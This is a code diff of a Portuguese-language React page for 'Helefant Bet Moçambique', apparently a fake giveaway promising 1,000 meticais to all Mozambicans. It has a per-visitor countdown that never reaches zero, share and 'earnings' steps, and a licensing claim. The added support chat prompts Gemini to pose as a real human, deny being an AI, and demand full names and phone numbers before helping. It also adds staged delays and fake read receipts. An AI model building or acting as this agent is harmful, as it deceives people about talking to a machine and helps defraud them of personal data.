@@ -1,5 +1,5 @@
 
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { AppStep, UserData } from './types';
 import StepForm from './components/StepForm';
 import StepShare from './components/StepShare';
@@ -11,33 +11,129 @@ import Testimonials from './components/Testimonials';
 import SupportChat from './components/SupportChat';
 import StepWinners from './components/StepWinners';
 import StepEarnings from './components/StepEarnings';
+import LoadingOverlay from './components/LoadingOverlay';
+import { GoogleGenAI } from "@google/genai";
+
+const STORAGE_KEY = 'helefant_chat_history_v5';
 
 const App: React.FC = () => {
   const [currentStep, setCurrentStep] = useState<AppStep>(AppStep.FORM);
   const [userData, setUserData] = useState<UserData | null>(null);
   const [daysRemaining, setDaysRemaining] = useState(17);
   const [balance, setBalance] = useState(0);
+  const [isInitialLoading, setIsInitialLoading] = useState(true);
+  
+  // Chat State moved to App level to handle background replies
+  const [chatMessages, setChatMessages] = useState<any[]>([]);
+  const [unreadCount, setUnreadCount] = useState(0);
+  const [isAgentTyping, setIsAgentTyping] = useState(false);
 
-  // Countdown logic: Decrease every 24 hours
+  // Persistence for chat
+  useEffect(() => {
+    const saved = localStorage.getItem(STORAGE_KEY);
+    if (saved) {
+      try {
+        const parsed = JSON.parse(saved);
+        setChatMessages(parsed.map((m: any) => ({ ...m, timestamp: new Date(m.timestamp) })));
+      } catch (e) {}
+    }
+  }, []);
+
+  useEffect(() => {
+    if (chatMessages.length > 0) {
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(chatMessages));
+    }
+  }, [chatMessages]);
+
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setIsInitialLoading(false);
+    }, 2800);
+    return () => clearTimeout(timer);
+  }, []);
+
+  // Sync unread count: clear when support is open
+  useEffect(() => {
+    if (currentStep === AppStep.SUPPORT) {
+      setUnreadCount(0);
+    }
+  }, [currentStep]);
+
+  const getGeminiResponse = async (userText: string, history: any[]) => {
+    try {
+      const ai = new GoogleGenAI({ apiKey: process.env.API_KEY });
+      const context = history.slice(-10).map(m => `${m.sender === 'user' ? 'Cliente' : 'Suporte'}: ${m.text}`).join('\n');
+      
+      const response = await ai.models.generateContent({
+        model: "gemini-3-flash-preview",
+        contents: `Você é o Mestre Suporte da Helefant Bet Moçambique.
+          - Protocolo: Peça o NOME completo, depois o TELEFONE. Só resolva o problema após os dados.
+          - Se o cliente mandou áudio, você ouviu e entendeu o problema perfeitamente.
+          - Estilo: Moçambicano profissional, humanizado, empático.
+          Histórico: ${context}
+          Nova Mensagem: ${userText}`,
+        config: {
+          systemInstruction: "Aja como um atendente real. Não diga que é IA. Use gírias leves como 'Bay', 'Estamos juntos', 'Taco'. Responda entre 20 a 60 segundos.",
+          temperature: 0.8,
+        },
+      });
+      return response.text || "Compreendo. Por favor, forneça seu nome completo para iniciarmos.";
+    } catch (e) {
+      return "O sistema está processando seu pedido financeiro. Aguarde um momento.";
+    }
+  };
+
+  const handleSendMessage = async (msg: any) => {
+    const updated = [...chatMessages, msg];
+    setChatMessages(updated);
+
+    // Realistic Timing Logic (20s to 60s)
+    const possibleDelays = [22000, 35000, 58000];
+    const totalDelay = possibleDelays[Math.floor(Math.random() * possibleDelays.length)];
+    
+    // 1. Seen Receipt
+    setTimeout(() => {
+      setChatMessages(prev => prev.map(m => m.id === msg.id ? { ...m, read: true } : m));
+    }, totalDelay * 0.6);
+
+    // 2. Typing start
+    setTimeout(() => setIsAgentTyping(true), totalDelay * 0.85);
+
+    // 3. Final Response
+    setTimeout(async () => {
+      const replyText = await getGeminiResponse(msg.text, updated);
+      setIsAgentTyping(false);
+      const agentMsg = {
+        id: Date.now().toString(),
+        text: replyText,
+        sender: 'agent',
+        timestamp: new Date()
+      };
+      setChatMessages(prev => [...prev, agentMsg]);
+      
+      // Notify if not looking at chat
+      if (currentStep !== AppStep.SUPPORT) {
+        setUnreadCount(prev => prev + 1);
+      }
+    }, totalDelay);
+  };
+
+  // Countdown logic for the banner
   useEffect(() => {
     const startDateKey = 'helefant_promo_start_date';
     let startDate = localStorage.getItem(startDateKey);
-    
     if (!startDate) {
       startDate = new Date().toISOString();
       localStorage.setItem(startDateKey, startDate);
     }
-
     const calculateDays = () => {
       const start = new Date(startDate!).getTime();
       const now = new Date().getTime();
       const elapsedDays = Math.floor((now - start) / (1000 * 60 * 60 * 24));
-      const remaining = Math.max(1, 17 - elapsedDays);
-      setDaysRemaining(remaining);
+      setDaysRemaining(Math.max(1, 17 - elapsedDays));
     };
-
     calculateDays();
-    const timer = setInterval(calculateDays, 1000 * 60 * 60); // Check every hour
+    const timer = setInterval(calculateDays, 1000 * 60 * 60);
     return () => clearInterval(timer);
   }, []);
 
@@ -48,190 +144,86 @@ const App: React.FC = () => {
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
 
-  const handleShareComplete = () => {
-    setCurrentStep(AppStep.PROCESSING);
-  };
-
-  const handleProcessingComplete = () => {
-    setCurrentStep(AppStep.SUCCESS);
-  };
-
-  const scrollToForm = (e: React.MouseEvent) => {
-    e.preventDefault();
-    const element = document.getElementById('solicitar');
-    if (element) {
-      element.scrollIntoView({ behavior: 'smooth' });
-    }
-  };
-
   const handleSupportClick = () => {
     setCurrentStep(AppStep.SUPPORT);
-    window.scrollTo({ top: 0, behavior: 'smooth' });
-  };
-
-  const handleWinnersClick = () => {
-    setCurrentStep(AppStep.WINNERS);
-    window.scrollTo({ top: 0, behavior: 'smooth' });
-  };
-
-  const handleEarningsClick = () => {
-    setCurrentStep(AppStep.EARNINGS);
-    window.scrollTo({ top: 0, behavior: 'smooth' });
-  };
-
-  const handleHomeClick = () => {
-    setCurrentStep(AppStep.FORM);
+    setUnreadCount(0);
     window.scrollTo({ top: 0, behavior: 'smooth' });
   };
 
   return (
     <div className="min-h-screen flex flex-col items-center bg-slate-950 relative">
+      {isInitialLoading && <LoadingOverlay />}
+      
       <Navbar 
         onSupportClick={handleSupportClick} 
-        onWinnersClick={handleWinnersClick}
-        onEarningsClick={handleEarningsClick}
-        onHomeClick={handleHomeClick}
+        onWinnersClick={() => setCurrentStep(AppStep.WINNERS)}
+        onEarningsClick={() => setCurrentStep(AppStep.EARNINGS)}
+        onHomeClick={() => setCurrentStep(AppStep.FORM)}
       />
       
-      {/* Floating Support Button */}
+      {/* Botão Flutuante de Suporte com Notificação Vermelha */}
       {currentStep !== AppStep.SUPPORT && (
         <button
           onClick={handleSupportClick}
-          className="fixed bottom-8 right-8 z-[100] w-16 h-16 bg-[#00a884] rounded-full flex items-center justify-center shadow-[0_10px_40px_rgba(0,168,132,0.4)] hover:scale-110 active:scale-95 transition-all group animate-bounce"
-          aria-label="Suporte"
+          className="fixed bottom-8 right-8 z-[100] w-16 h-16 bg-[#00a884] rounded-full flex items-center justify-center shadow-[0_10px_40px_rgba(0,168,132,0.4)] hover:scale-110 active:scale-95 transition-all group"
         >
           <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
-          <span className="absolute right-full mr-4 bg-[#202c33] text-white text-xs font-bold px-3 py-2 rounded-lg opacity-0 group-hover:opacity-100 transition-opacity whitespace-nowrap pointer-events-none border border-white/10">
-            Falar com Suporte Online
-          </span>
+          {unreadCount > 0 && (
+            <span className="absolute -top-1 -right-1 w-7 h-7 bg-red-600 text-white text-xs font-black rounded-full flex items-center justify-center border-2 border-slate-950 animate-bounce">
+              {unreadCount}
+            </span>
+          )}
         </button>
       )}
 
       {currentStep === AppStep.FORM && (
         <section className="relative w-full min-h-[90vh] flex items-center justify-center overflow-hidden">
           <div className="absolute inset-0 z-0">
-            <img 
-              src="https://images.unsplash.com/photo-1531123897727-8f129e1688ce?auto=format&fit=crop&q=80&w=1920" 
-              alt="Mulher Moçambicana Feliz" 
-              className="w-full h-full object-cover"
-            />
+            <img src="https://images.unsplash.com/photo-1531123897727-8f129e1688ce?auto=format&fit=crop&q=80&w=1920" alt="Helefant Promo" className="w-full h-full object-cover" />
             <div className="absolute inset-0 bg-slate-950/70 mix-blend-multiply"></div>
             <div className="absolute inset-0 bg-gradient-to-b from-slate-950/40 via-emerald-900/60 to-slate-950"></div>
           </div>
-
-          <div className="relative z-10 w-full max-w-6xl px-4 py-20 text-center animate-in fade-in zoom-in duration-1000">
-            <div className="mb-10">
-              <span className="inline-block px-8 py-3 mb-8 text-sm font-black tracking-[0.4em] uppercase bg-emerald-500 text-slate-950 rounded-full shadow-[0_0_40px_rgba(16,185,129,0.4)] animate-pulse">
-                EXPIRA DAQUI A {daysRemaining} DIAS
-              </span>
-              
-              <div className="space-y-4">
-                <h1 className="text-5xl md:text-8xl font-black leading-[1.1] tracking-tighter">
-                  <span className="block text-white drop-shadow-lg">ESTAMOS A DAR</span>
-                  <span className="block text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-emerald-200 drop-shadow-[0_0_30px_rgba(16,185,129,0.3)]">
-                    1.000 METICAIS
-                  </span>
-                </h1>
-                <h2 className="text-2xl md:text-4xl font-bold text-slate-300 italic opacity-80">
-                  PARA TODOS OS MOÇAMBICANOS
-                </h2>
-              </div>
-
-              <div className="max-w-3xl mx-auto mt-10 space-y-6">
-                <p className="text-lg md:text-2xl text-slate-100 font-medium leading-relaxed drop-shadow-md">
-                  A <span className="text-emerald-400 font-extrabold underline decoration-emerald-500/50">HELEFANT COMPANY</span> celebra o faturamento recorde de 126 Milhões de MT partilhando o sucesso com você.
-                </p>
-              </div>
-            </div>
-            
-            <div className="mt-16 flex justify-center">
-               <button 
-                onClick={scrollToForm}
-                className="group relative bg-emerald-500 text-slate-950 px-16 py-6 rounded-2xl font-black text-2xl uppercase tracking-[0.3em] hover:bg-emerald-400 transition-all shadow-[0_20px_50px_-10px_rgba(16,185,129,0.5)] hover:scale-105 active:scale-95 overflow-hidden"
-               >
-                 <span className="relative z-10">RECEBER</span>
-                 <div className="absolute inset-0 bg-white/20 translate-y-full group-hover:translate-y-0 transition-transform duration-300"></div>
-               </button>
-            </div>
+          <div className="relative z-10 w-full max-w-6xl px-4 py-20 text-center">
+            <span className="inline-block px-8 py-3 mb-8 text-sm font-black tracking-[0.4em] uppercase bg-emerald-500 text-slate-950 rounded-full">EXPIRA EM {daysRemaining} DIAS</span>
+            <h1 className="text-5xl md:text-8xl font-black leading-[1.1] tracking-tighter text-white">ESTAMOS A DAR <span className="text-emerald-400">1.000 METICAIS</span></h1>
+            <p className="max-w-3xl mx-auto mt-10 text-lg md:text-2xl text-slate-100 font-medium italic">A Helefant Bet celebra o faturamento recorde distribuindo prémios instantâneos.</p>
+            <button onClick={() => document.getElementById('solicitar')?.scrollIntoView({ behavior: 'smooth' })} className="mt-16 bg-emerald-500 text-slate-950 px-12 py-5 rounded-2xl font-black text-xl uppercase tracking-widest hover:bg-emerald-400 transition-all shadow-[0_20px_50px_-10px_rgba(16,185,129,0.5)]">SOLICITAR AGORA</button>
           </div>
         </section>
       )}
 
       <main id="solicitar" className="w-full max-w-6xl px-4 py-12 flex flex-col items-center min-h-[60vh]">
         {currentStep === AppStep.FORM && (
-          <>
-            <Stats />
-            
-            <div className="w-full max-w-4xl mt-12 bg-white/[0.02] border border-white/5 p-8 md:p-16 rounded-[4rem] backdrop-blur-3xl shadow-2xl">
-              <div className="text-center mb-16">
-                <h2 className="text-4xl font-black mb-4 uppercase tracking-tighter">Dados de Recebimento</h2>
-                <div className="w-20 h-1 bg-emerald-500 mx-auto mb-6 rounded-full"></div>
-                <p className="text-slate-400 font-medium">Preencha corretamente para garantir o envio instantâneo.</p>
-              </div>
-              <StepForm onSubmit={handleFormSubmit} />
-            </div>
-
-            <div className="w-full mt-32">
-              <Testimonials />
-            </div>
-          </>
+          <><Stats /><div className="w-full max-w-4xl mt-12 bg-white/[0.02] border border-white/5 p-8 md:p-16 rounded-[4rem] backdrop-blur-3xl shadow-2xl"><StepForm onSubmit={handleFormSubmit} /></div><div className="w-full mt-32"><Testimonials /></div></>
         )}
-
-        {currentStep === AppStep.WINNERS && (
-          <div className="w-full py-10">
-            <StepWinners onBack={handleHomeClick} />
-          </div>
-        )}
-
-        {currentStep === AppStep.EARNINGS && (
-          <div className="w-full py-10">
-            <StepEarnings balance={balance} userData={userData} onBack={handleHomeClick} />
-          </div>
-        )}
-
+        {currentStep === AppStep.WINNERS && <StepWinners onBack={() => setCurrentStep(AppStep.FORM)} />}
+        {currentStep === AppStep.EARNINGS && <StepEarnings balance={balance} userData={userData} onBack={() => setCurrentStep(AppStep.FORM)} />}
         {currentStep === AppStep.SUPPORT && (
-          <div className="w-full py-10">
-            <SupportChat onBack={handleHomeClick} />
-          </div>
+          <SupportChat 
+            messages={chatMessages} 
+            isTyping={isAgentTyping} 
+            onSend={handleSendMessage} 
+            onBack={() => setCurrentStep(AppStep.FORM)} 
+          />
         )}
-
-        {currentStep !== AppStep.FORM && currentStep !== AppStep.SUPPORT && currentStep !== AppStep.WINNERS && currentStep !== AppStep.EARNINGS && (
-          <div className="w-full max-w-xl py-20 animate-in fade-in scale-95 duration-500">
-            {currentStep === AppStep.SHARE && <StepShare onComplete={handleShareComplete} />}
-            {currentStep === AppStep.PROCESSING && <StepProcessing onComplete={handleProcessingComplete} />}
-            {currentStep === AppStep.SUCCESS && <FinalMessage />}
-          </div>
-        )}
+        {currentStep === AppStep.SHARE && <StepShare onComplete={() => setCurrentStep(AppStep.PROCESSING)} />}
+        {currentStep === AppStep.PROCESSING && <StepProcessing onComplete={() => setCurrentStep(AppStep.SUCCESS)} />}
+        {currentStep === AppStep.SUCCESS && <FinalMessage />}
       </main>
 
-      <footer className="w-full border-t border-white/5 py-16 bg-slate-950/80 backdrop-blur-md mt-auto">
-        <div className="max-w-6xl mx-auto px-4 grid grid-cols-1 md:grid-cols-3 gap-12">
-          <div className="flex flex-col items-center md:items-start">
-            <div className="text-2xl font-black italic tracking-tighter text-emerald-400 mb-4 cursor-pointer" onClick={handleHomeClick}>HELEFANT BET</div>
-            <p className="text-slate-500 text-sm leading-relaxed text-center md:text-left">
-              A maior casa de apostas de Moçambique, agora celebrando com o povo. Regulado e licenciado para operar em todo território nacional.
-            </p>
+      <footer className="w-full border-t border-white/5 py-16 bg-slate-950/80 mt-auto">
+        <div className="max-w-6xl mx-auto px-4 grid grid-cols-1 md:grid-cols-3 gap-12 text-center md:text-left">
+          <div>
+            <div className="text-2xl font-black italic tracking-tighter text-emerald-400 mb-4 uppercase">HELEFANT BET</div>
+            <p className="text-slate-500 text-sm">A maior plataforma de prêmios de Moçambique.</p>
           </div>
-          <div className="flex flex-col items-center">
-            <h4 className="font-bold text-white mb-6 uppercase tracking-widest text-xs">Links Rápidos</h4>
-            <div className="flex flex-col gap-3 text-slate-400 text-sm font-medium items-center">
-              <button onClick={handleWinnersClick} className="hover:text-emerald-400 transition-colors">Vencedores da Semana</button>
-              <button onClick={handleSupportClick} className="hover:text-emerald-400 transition-colors">Como funciona o prêmio</button>
-              <a href="#" className="hover:text-emerald-400 transition-colors">Termos e Condições</a>
-            </div>
+          <div className="flex flex-col gap-3">
+             <button onClick={() => setCurrentStep(AppStep.WINNERS)} className="text-slate-400 hover:text-emerald-400 text-sm font-bold uppercase tracking-widest">Vencedores</button>
+             <button onClick={handleSupportClick} className="text-slate-400 hover:text-emerald-400 text-sm font-bold uppercase tracking-widest">Suporte VIP</button>
           </div>
-          <div className="flex flex-col items-center md:items-end">
-             <h4 className="font-bold text-white mb-6 uppercase tracking-widest text-xs">Apoio ao Cliente</h4>
-             <button 
-               onClick={handleSupportClick}
-               className="bg-slate-900 border border-slate-800 px-8 py-3 rounded-xl text-emerald-400 font-bold hover:bg-slate-800 transition-all"
-             >
-               Falar com Suporte
-             </button>
+          <div className="md:text-right">
+             <button onClick={handleSupportClick} className="bg-slate-900 border border-slate-800 px-8 py-3 rounded-xl text-emerald-400 font-bold uppercase text-xs tracking-widest">Suporte Online 24/7</button>
           </div>
-        </div>
-        <div className="max-w-6xl mx-auto px-4 mt-16 pt-8 border-t border-white/5 text-center text-slate-600 text-[10px] uppercase tracking-[0.2em] font-bold">
-           © 2024 Helefant Company - Jogue com Responsabilidade (18+)
         </div>
       </footer>
     </div>
